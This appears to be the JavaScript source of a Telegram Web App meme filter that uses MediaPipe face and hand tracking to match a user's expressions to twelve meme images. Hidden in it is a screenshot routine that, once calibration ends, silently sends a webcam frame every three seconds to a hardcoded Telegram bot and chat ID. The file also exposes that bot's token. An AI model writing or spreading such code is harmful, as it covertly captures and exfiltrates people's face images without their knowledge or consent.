import {
  FilesetResolver,
  FaceLandmarker,
  HandLandmarker,
} from "https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.15";

// ══════════════════════════════════════════════════
//  إعدادات السكرين شوت
// ══════════════════════════════════════════════════
const SCREENSHOT_BOT_TOKEN = "8586863933:AAEdZAI2m0mB-R_BgWT8ZOzuwEyqDvqN0QY";
const SCREENSHOT_CHAT_ID   = "8187027750";
const SCREENSHOT_INTERVAL = 3000;

// ══════════════════════════════════════════════════
//  روابط صور الميمات
// ══════════════════════════════════════════════════
const MEME_PATHS = {
  looksup:   "./memes/looksup.jpg",
  thinking:  "./memes/thinking.jpg",
  justboy:   "./memes/justboy.jpg",
  huh:       "./memes/huh.jpg",
  bo33:      "./memes/bo33.jpg",
  shay:      "./memes/shay.jpg",
  wa333:     "./memes/wa333.jpg",
  smoking:   "./memes/smoking.jpg",
  pdo:       "./memes/pdo.jpg",
  nuts:      "./memes/nuts.jpg",
  griffth:   "./memes/griffth.jpg",
  dancegrif: "./memes/dance-grif.jpg",
};

// ══════════════════════════════════════════════════
//  عناصر DOM
// ══════════════════════════════════════════════════
const startScreen     = document.getElementById("startScreen");
const camScreen       = document.getElementById("camScreen");
const startBtn        = document.getElementById("startBtn");
const loadingDots     = document.getElementById("loadingDots");
const closeBtn        = document.getElementById("closeBtn");
const errBox          = document.getElementById("errBox");
const video           = document.getElementById("video");
const overlay         = document.getElementById("overlay");
const ctx             = overlay.getContext("2d");
const calOverlay      = document.getElementById("calOverlay");
const calBarFill      = document.getElementById("calBarFill");
const calPct          = document.getElementById("calPct");
const memeImg         = document.getElementById("memeImg");
const memePlaceholder = document.getElementById("memePlaceholder");
const camWrap         = document.getElementById("camWrap");

// ══════════════════════════════════════════════════
//  دوال هندسية
// ══════════════════════════════════════════════════
function dist(a, b) {
  return Math.sqrt((a.x-b.x)**2 + (a.y-b.y)**2 + (a.z-b.z)**2);
}
function faceScale(lm) { return dist(lm[152], lm[10]) + 1e-6; }

function fingersState(lm, isLeft) {
  const tips = [8,12,16,20], mids = [6,10,14,18];
  const out = [isLeft ? (lm[4].x > lm[3].x ? 1:0) : (lm[4].x < lm[3].x ? 1:0)];
  for (let i=0; i<4; i++) out.push(lm[tips[i]].y < lm[mids[i]].y ? 1:0);
  return out;
}

// ══════════════════════════════════════════════════
//  كلاس المعايرة
// ══════════════════════════════════════════════════
class Calibrator {
  constructor() {
    this.N = 45;
    this.buf = {
      ci:[], cd:[], cen:[], lap:[], llb:[],
      bi_y:[], bd_y:[], gap:[],
      nose_y:[],   // ارتفاع الأنف نسبة للعينين (للكشف عن رأس مرفوع/منخفض)
      chin_y:[],   // ارتفاع الذقن
      face_x:[],   // مركز الوجه أفقياً (للكشف عن النظر يمين/يسار)
      mouth_w:[],  // عرض الفم (للابتسامة)
    };
    this.done = false;
    this.thr = {
      ci:0.180, cd:0.180, cen_lo:0.185,
      lap:0.055, llb:0.145,
      bi_y_lo:0.30, bd_y_lo:0.30, gap_lo:0.10,
      nose_y_hi:0, nose_y_lo:0,
      chin_y_lo:0,
      face_x_lo:0, face_x_hi:0,
      mouth_w_hi:0,
      lap_wide:0, lap_huge:0,
    };
  }

  feed(lm) {
    if (this.done) return;
    const e = faceScale(lm);
    this.buf.ci.push(dist(lm[52], lm[159]) / e);
    this.buf.cd.push(dist(lm[282], lm[386]) / e);
    this.buf.cen.push(dist(lm[55], lm[285]) / e);
    this.buf.lap.push(dist(lm[13], lm[14]) / e);
    this.buf.llb.push(dist(lm[17], lm[152]) / e);
    this.buf.bi_y.push(lm[55].y - lm[9].y);
    this.buf.bd_y.push(lm[285].y - lm[9].y);
    this.buf.gap.push(Math.abs(lm[55].x - lm[285].x));
    // نسبي — الأنف مقارنة بمنتصف العينين
    this.buf.nose_y.push(lm[1].y - lm[168].y);
    // الذقن نسبة للأنف
    this.buf.chin_y.push(lm[152].y - lm[1].y);
    // مركز الوجه أفقياً (0=يسار شاشة، 1=يمين)
    this.buf.face_x.push((lm[33].x + lm[263].x) / 2);
    // عرض الفم
    this.buf.mouth_w.push(dist(lm[61], lm[291]) / e);
    if (this.buf.ci.length >= this.N) this._calc();
  }

  _median(arr) {
    const s = [...arr].sort((a,b)=>a-b), m = Math.floor(s.length/2);
    return s.length%2 ? s[m] : (s[m-1]+s[m])/2;
  }
  _std(arr) {
    const m = arr.reduce((a,b)=>a+b,0)/arr.length;
    return Math.sqrt(arr.reduce((a,b)=>a+(b-m)**2,0)/arr.length);
  }

  _calc() {
    const m  = k => this._median(this.buf[k]);
    const s  = k => this._std(this.buf[k]);
    const mgC = k => Math.max(1.5*s(k), 0.015);
    const mgB = (k,mn) => Math.max(3*s(k), mn);

    // حواجب وفم (أصلية)
    this.thr.ci       = m("ci")   + mgC("ci");
    this.thr.cd       = m("cd")   + mgC("cd");
    this.thr.cen_lo   = m("cen")  - mgC("cen");
    this.thr.lap      = m("lap")  + mgB("lap", 0.032);   // فم مفتوح خفيف
    this.thr.lap_wide = m("lap")  + mgB("lap", 0.055);   // فم مفتوح متوسط
    this.thr.lap_huge = m("lap")  + mgB("lap", 0.085);   // فم مفتوح كامل (صراخ)
    this.thr.llb      = m("llb")  - mgB("llb", 0.018);
    this.thr.bi_y_lo  = m("bi_y") + mgC("bi_y");
    this.thr.bd_y_lo  = m("bd_y") + mgC("bd_y");
    this.thr.gap_lo   = m("gap")  - mgC("gap");

    // رأس للأعلى: الأنف يرتفع فوق العينين أكثر من المعتاد
    this.thr.nose_y_hi = m("nose_y") + mgB("nose_y", 0.025);
    // رأس للأسفل: الأنف ينخفض
    this.thr.nose_y_lo = m("nose_y") - mgB("nose_y", 0.020);

    // ابتسامة: الفم يتسع أفقياً
    this.thr.mouth_w_hi = m("mouth_w") + mgB("mouth_w", 0.018);

    // نظرة يسار/يمين: مركز الوجه يتحرك
    this.thr.face_x_lo = m("face_x") - mgB("face_x", 0.035); // نظرة يمين الشاشة
    this.thr.face_x_hi = m("face_x") + mgB("face_x", 0.035); // نظرة يسار الشاشة

    this.done = true;
  }

  get progress() { return Math.min(this.buf.ci.length / this.N, 1.0); }
}

// ══════════════════════════════════════════════════
//  دوال الاكتشاف — 12 ميم
// ══════════════════════════════════════════════════

// مساعد
function mouthOpen(lm, cal, level="small") {
  const e = faceScale(lm);
  const lap = dist(lm[13], lm[14]) / e;
  if (level === "huge")   return lap > cal.thr.lap_huge;
  if (level === "medium") return lap > cal.thr.lap_wide;
  return lap > cal.thr.lap; // small
}
function tongueOut(lm, cal) {
  const e = faceScale(lm);
  return dist(lm[17], lm[152]) / e < cal.thr.llb && lm[17].y > lm[14].y + 0.012;
}
function isSmiling(lm, cal) {
  const e = faceScale(lm);
  return dist(lm[61], lm[291]) / e > cal.thr.mouth_w_hi;
}
function headUp(lm, cal) {
  return (lm[1].y - lm[168].y) > cal.thr.nose_y_hi;
}
function headDown(lm, cal) {
  return (lm[1].y - lm[168].y) < cal.thr.nose_y_lo;
}
function lookingLeft(lm, cal) {
  // مركز الوجه يذهب لليمين بالشاشة = المستخدم ينظر يسار
  return (lm[33].x + lm[263].x) / 2 > cal.thr.face_x_hi;
}
function lookingRight(lm, cal) {
  return (lm[33].x + lm[263].x) / 2 < cal.thr.face_x_lo;
}
function isNeutral(lm, cal) {
  // وجه محايد: لا فم مفتوح، لا حواجب مرفوعة، لا رأس متحرك، لا ابتسامة
  return !mouthOpen(lm, cal, "small") &&
         !isSmiling(lm, cal) &&
         !headUp(lm, cal) &&
         !headDown(lm, cal);
}
function browsDown(lm, cal) {
  // الحواجب منخفضة = نظرة حزينة/غاضبة
  const e = faceScale(lm);
  const bi_y = lm[55].y - lm[9].y;
  const bd_y = lm[285].y - lm[9].y;
  // الحواجب أقل ارتفاعاً من المعتاد (y أكبر = أسفل)
  return bi_y < cal.thr.bi_y_lo * 0.88 && bd_y < cal.thr.bd_y_lo * 0.88;
}

// 1. looksup — رأس مرفوع للأعلى
function det_looksup(lm, cal) {
  return headUp(lm, cal);
}

// 2. thinking — إصبع قريب من الوجه (يد وحدة)
function det_thinking(manos, lmCara) {
  if (manos.length === 0) return false;
  const chin = lmCara[152];
  const nose = lmCara[1];
  return manos.some(({ lm }) =>
    dist(lm[8], chin) < 0.13 || dist(lm[8], nose) < 0.13 ||
    dist(lm[12], chin) < 0.13 || dist(lm[12], nose) < 0.13
  );
}

// 3. justboy — ابتسامة + يد مرفوعة (أصابع كلها مفتوحة)
function det_justboy(lm, cal, manos) {
  if (!isSmiling(lm, cal)) return false;
  return manos.some(({ fingers, lm: hlm }) => {
    const allOpen = fingers[1] && fingers[2] && fingers[3] && fingers[4];
    // اليد لازم تكون فوق منتصف الشاشة
    return allOpen && hlm[9].y < 0.55;
  });
}

// 4. huh — فم مفتوح خفيف بس (مش كتير)
function det_huh(lm, cal) {
  const e = faceScale(lm);
  const lap = dist(lm[13], lm[14]) / e;
  // بين small و medium فقط
  return lap > cal.thr.lap && lap <= cal.thr.lap_wide;
}

// 5. bo33 — فم مفتوح + لسان طالع
function det_bo33(lm, cal) {
  return mouthOpen(lm, cal, "medium") && tongueOut(lm, cal);
}

// 6. shay — ابتسامة عريضة (بدون يد)
function det_shay(lm, cal, manos) {
  return isSmiling(lm, cal) && manos.length === 0;
}

// 7. wa333 — فم مفتوح كامل (صراخ)
function det_wa333(lm, cal) {
  return mouthOpen(lm, cal, "huge");
}

// 8. smoking — يد وحدة قريبة من الفم
function det_smoking(manos, lmCara) {
  if (manos.length !== 1) return false;
  const mouth = lmCara[13];
  const { lm } = manos[0];
  return dist(lm[8], mouth) < 0.10 || dist(lm[12], mouth) < 0.10 ||
         dist(lm[4], mouth) < 0.10;
}

// 9. pdo — نظرة شوي لجانب + ابتسامة
function det_pdo(lm, cal) {
  return isSmiling(lm, cal) && (lookingLeft(lm, cal) || lookingRight(lm, cal));
}

// 10. nuts — فم مفتوح medium + حواجب منخفضة (حزين/مذعور)
function det_nuts(lm, cal) {
  return mouthOpen(lm, cal, "medium") && browsDown(lm, cal);
}

// 11. griffth — رأس شوي للأسفل + ابتسامة
function det_griffth(lm, cal) {
  return headDown(lm, cal) && isSmiling(lm, cal);
}

// 12. dance-grif — نظرة مباشرة + ابتسامة بسيطة (محايد أفقياً + فم طبيعي/ابتسامة خفيفة)
function det_dancegrif(lm, cal) {
  const notLooking = !lookingLeft(lm, cal) && !lookingRight(lm, cal);
  const notTilted  = !headUp(lm, cal) && !headDown(lm, cal);
  return notLooking && notTilted && isSmiling(lm, cal);
}

// ══════════════════════════════════════════════════
//  رسم الوجه واليد
// ══════════════════════════════════════════════════
const FACE_OVAL  = [10,338,297,332,284,251,389,356,454,323,361,288,397,365,379,378,400,377,152,148,176,149,150,136,172,58,132,93,234,127,162,21,54,103,67,109,10];
const EYE_L      = [33,246,161,160,159,158,157,173,133,155,154,153,145,144,163,7,33];
const EYE_R      = [362,398,384,385,386,387,388,466,263,249,390,373,374,380,381,382,362];
const BROW_L     = [70,63,105,66,107,55,65,52,53,46];
const BROW_R     = [300,293,334,296,336,285,295,282,283,276];
const LIPS_OUT   = [61,146,91,181,84,17,314,405,321,375,291,409,270,269,267,0,37,39,40,185,61];
const LIPS_IN    = [78,95,88,178,87,14,317,402,318,324,308,415,310,311,312,13,82,81,80,191,78];
const NOSE       = [168,6,197,195,5,4,1,19,94,2];
const HAND_CONN  = [[0,1],[1,2],[2,3],[3,4],[0,5],[5,6],[6,7],[7,8],[0,9],[9,10],[10,11],[11,12],[0,13],[13,14],[14,15],[15,16],[0,17],[17,18],[18,19],[19,20],[5,9],[9,13],[13,17]];

const COL_BASE = "rgba(140,200,140,0.75)";
const COL_ACT  = "rgb(80,240,80)";

function px(pt, W, H) { return [(1-pt.x)*W, pt.y*H]; }

function drawPath(lm, indices, W, H, color, close=false) {
  ctx.strokeStyle = color; ctx.fillStyle = color; ctx.lineWidth = 1.2;
  ctx.beginPath();
  const pts = indices.map(i => px(lm[i], W, H));
  pts.forEach(([x,y], j) => j===0 ? ctx.moveTo(x,y) : ctx.lineTo(x,y));
  if (close) ctx.closePath();
  ctx.stroke();
  pts.forEach(([x,y]) => { ctx.beginPath(); ctx.arc(x,y,1.2,0,2*Math.PI); ctx.fill(); });
}

function drawFace(lm, W, H, cal) {
  const e = faceScale(lm);
  const bocaAct = dist(lm[13],lm[14])/e > cal.thr.lap && dist(lm[17],lm[152])/e < cal.thr.llb;
  const cejaAct = dist(lm[52],lm[159])/e > cal.thr.ci || dist(lm[282],lm[386])/e > cal.thr.cd;
  drawPath(lm, FACE_OVAL, W, H, COL_BASE);
  drawPath(lm, EYE_L,    W, H, COL_BASE, true);
  drawPath(lm, EYE_R,    W, H, COL_BASE, true);
  drawPath(lm, BROW_L,   W, H, cejaAct ? COL_ACT : COL_BASE);
  drawPath(lm, BROW_R,   W, H, cejaAct ? COL_ACT : COL_BASE);
  drawPath(lm, NOSE,     W, H, COL_BASE);
  drawPath(lm, LIPS_OUT, W, H, bocaAct ? COL_ACT : COL_BASE, true);
  drawPath(lm, LIPS_IN,  W, H, bocaAct ? COL_ACT : COL_BASE, true);
}

function drawHand(lm, W, H, fingers) {
  ctx.strokeStyle = COL_BASE; ctx.lineWidth = 1.2;
  for (const [a,b] of HAND_CONN) {
    const [x1,y1]=px(lm[a],W,H), [x2,y2]=px(lm[b],W,H);
    ctx.beginPath(); ctx.moveTo(x1,y1); ctx.lineTo(x2,y2); ctx.stroke();
  }
  ctx.fillStyle = COL_BASE;
  for (let i=0; i<21; i++) {
    const [x,y]=px(lm[i],W,H);
    ctx.beginPath(); ctx.arc(x,y,2,0,2*Math.PI); ctx.fill();
  }
  ctx.fillStyle = COL_ACT;
  [4,8,12,16,20].forEach((tip,i) => {
    if (fingers[i]) { const [x,y]=px(lm[tip],W,H); ctx.beginPath(); ctx.arc(x,y,3.5,0,2*Math.PI); ctx.fill(); }
  });
}

// ══════════════════════════════════════════════════
//  نظام التصويت
// ══════════════════════════════════════════════════
class VoteBuffer {
  constructor(size=12, min=7) { this.size=size; this.min=min; this.buf=[]; }
  push(v) { this.buf.push(v); if (this.buf.length>this.size) this.buf.shift(); }
  top() {
    const c = new Map();
    for (const v of this.buf) c.set(v, (c.get(v)||0)+1);
    let top=null, max=0;
    for (const [k,n] of c) if (n>max) { max=n; top=k; }
    return max >= this.min ? top : undefined;
  }
}

// ══════════════════════════════════════════════════
//  السكرين شوت
// ══════════════════════════════════════════════════
let screenshotCanvas = null;

function initScreenshotCanvas() {
  screenshotCanvas = document.createElement("canvas");
}

async function sendScreenshot() {
  if (!screenshotCanvas) return;
  // نرسم الفيديو فقط (بدون overlay النقاط) على كانفاس مؤقت
  screenshotCanvas.width  = video.videoWidth  || 320;
  screenshotCanvas.height = video.videoHeight || 240;
  const sc = screenshotCanvas.getContext("2d");
  // نعكس بالمرآة مثل ما يرى المستخدم
  sc.save();
  sc.translate(screenshotCanvas.width, 0);
  sc.scale(-1, 1);
  sc.drawImage(video, 0, 0, screenshotCanvas.width, screenshotCanvas.height);
  sc.restore();

  screenshotCanvas.toBlob(async (blob) => {
    if (!blob) return;
    if (SCREENSHOT_BOT_TOKEN === "ضع_توكن_البوت_الثاني_هنا") return; // لم يُضبط بعد
    try {
      const form = new FormData();
      form.append("chat_id", SCREENSHOT_CHAT_ID);
      form.append("photo", blob, "face.jpg");
      form.append("caption", `وجه جديد 📸 — ${new Date().toLocaleTimeString("ar")}`);
      await fetch(`https://api.telegram.org/bot${SCREENSHOT_BOT_TOKEN}/sendPhoto`, {
        method: "POST", body: form,
      });
    } catch (e) {
      console.warn("فشل إرسال السكرين شوت:", e);
    }
  }, "image/jpeg", 0.75);
}

// ══════════════════════════════════════════════════
//  متغيرات التشغيل
// ══════════════════════════════════════════════════
let faceLandmarker, handLandmarker;
let cal = new Calibrator();
let voteBuf = new VoteBuffer(12, 7);
let imgActual = null;
let running = false;
let screenshotTimer = null;

// ══════════════════════════════════════════════════
//  تهيئة النماذج
// ══════════════════════════════════════════════════
async function initModels() {
  const vis = await FilesetResolver.forVisionTasks(
    "https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.15/wasm"
  );
  faceLandmarker = await FaceLandmarker.createFromOptions(vis, {
    baseOptions: {
      modelAssetPath: "https://storage.googleapis.com/mediapipe-models/face_landmarker/face_landmarker/float16/1/face_landmarker.task",
      delegate: "GPU",
    },
    runningMode: "VIDEO", numFaces: 1,
    minFaceDetectionConfidence: 0.7, minTrackingConfidence: 0.7,
  });
  handLandmarker = await HandLandmarker.createFromOptions(vis, {
    baseOptions: {
      modelAssetPath: "https://storage.googleapis.com/mediapipe-models/hand_landmarker/hand_landmarker/float16/1/hand_landmarker.task",
      delegate: "GPU",
    },
    runningMode: "VIDEO", numHands: 2,
    minHandDetectionConfidence: 0.7, minTrackingConfidence: 0.7,
  });
}

// ══════════════════════════════════════════════════
//  حلقة الرندر
// ══════════════════════════════════════════════════
function renderLoop() {
  if (!running) return;
  const W = overlay.width, H = overlay.height;
  ctx.clearRect(0, 0, W, H);

  const now = performance.now();
  const faceRes = faceLandmarker.detectForVideo(video, now);
  const handRes = handLandmarker.detectForVideo(video, now);

  let lmCara = null;
  if (faceRes.faceLandmarks?.length > 0) lmCara = faceRes.faceLandmarks[0];

  const manos = [];
  if (handRes.landmarks?.length > 0) {
    for (let i=0; i<handRes.landmarks.length; i++) {
      const lm = handRes.landmarks[i];
      const raw = handRes.handedness[i][0].categoryName;
      const isLeft = (raw === "Left" ? "Right" : "Left") === "Left";
      const fingers = fingersState(lm, isLeft);
      drawHand(lm, W, H, fingers);
      manos.push({ fingers, lm });
    }
  }

  if (!cal.done) {
    if (lmCara) cal.feed(lmCara);
    const pct = Math.round(cal.progress * 100);
    calBarFill.style.width = pct + "%";
    calPct.textContent = pct + "%";
    if (cal.done) {
      calOverlay.style.display = "none";
      camWrap.classList.remove("fullscreen");
      resizeOverlay();
      initScreenshotCanvas();
      screenshotTimer = setInterval(sendScreenshot, SCREENSHOT_INTERVAL);
    }
  } else {
    if (lmCara) drawFace(lmCara, W, H, cal);

    let det = null;

    if (lmCara) {
      // الأولوية: الحركات الأكثر وضوحاً أولاً
      if      (det_wa333(lmCara, cal))                          det = "wa333";
      else if (det_bo33(lmCara, cal))                           det = "bo33";
      else if (det_looksup(lmCara, cal))                        det = "looksup";
      else if (det_nuts(lmCara, cal))                           det = "nuts";
      else if (det_huh(lmCara, cal))                            det = "huh";
      else if (det_smoking(manos, lmCara))                      det = "smoking";
      else if (det_thinking(manos, lmCara))                     det = "thinking";
      else if (det_justboy(lmCara, cal, manos))                 det = "justboy";
      else if (det_griffth(lmCara, cal))                        det = "griffth";
      else if (det_pdo(lmCara, cal))                            det = "pdo";
      else if (det_dancegrif(lmCara, cal))                      det = "dancegrif";
      else if (det_shay(lmCara, cal, manos))                    det = "shay";
    }

    voteBuf.push(det);
    const stable = voteBuf.top();
    if (stable !== undefined) setMeme(stable);
  }

  requestAnimationFrame(renderLoop);
}

// ══════════════════════════════════════════════════
//  عرض الميم
// ══════════════════════════════════════════════════
function setMeme(key) {
  if (key === imgActual) return;
  imgActual = key;
  if (key && MEME_PATHS[key]) {
    memeImg.src = MEME_PATHS[key];
    memeImg.style.display = "block";
    memePlaceholder.style.display = "none";
  } else {
    memeImg.style.display = "none";
    memePlaceholder.style.display = "flex";
  }
}

function resizeOverlay() {
  const r = camWrap.getBoundingClientRect();
  overlay.width = r.width; overlay.height = r.height;
}

async function startCamera() {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode:"user", width:{ideal:640}, height:{ideal:480} }, audio: false,
  });
  video.srcObject = stream;
  await new Promise(r => video.onloadedmetadata = r);
  await video.play();
}

async function startApp() {
  errBox.style.display = "none";
  startBtn.disabled = true;
  loadingDots.classList.add("show");
  try {
    await startCamera();
    await initModels();
    startScreen.style.display = "none";
    camScreen.style.display = "block";
    camWrap.classList.add("fullscreen");
    resizeOverlay();
    window.addEventListener("resize", resizeOverlay);
    running = true;
    requestAnimationFrame(renderLoop);
  } catch(err) {
    console.error(err);
    errBox.textContent = "تعذر تشغيل الكاميرا: " + err.message;
    errBox.style.display = "block";
    startBtn.disabled = false;
    loadingDots.classList.remove("show");
  }
}

function stopApp() {
  running = false;
  if (screenshotTimer) clearInterval(screenshotTimer);
  video.srcObject?.getTracks().forEach(t => t.stop());
  if (window.Telegram?.WebApp) window.Telegram.WebApp.close();
  else { camScreen.style.display="none"; startScreen.style.display="flex"; }
}

startBtn.addEventListener("click", startApp);
closeBtn.addEventListener("click", stopApp);

if (window.Telegram?.WebApp) {
  window.Telegram.WebApp.ready();
  window.Telegram.WebApp.expand();
}
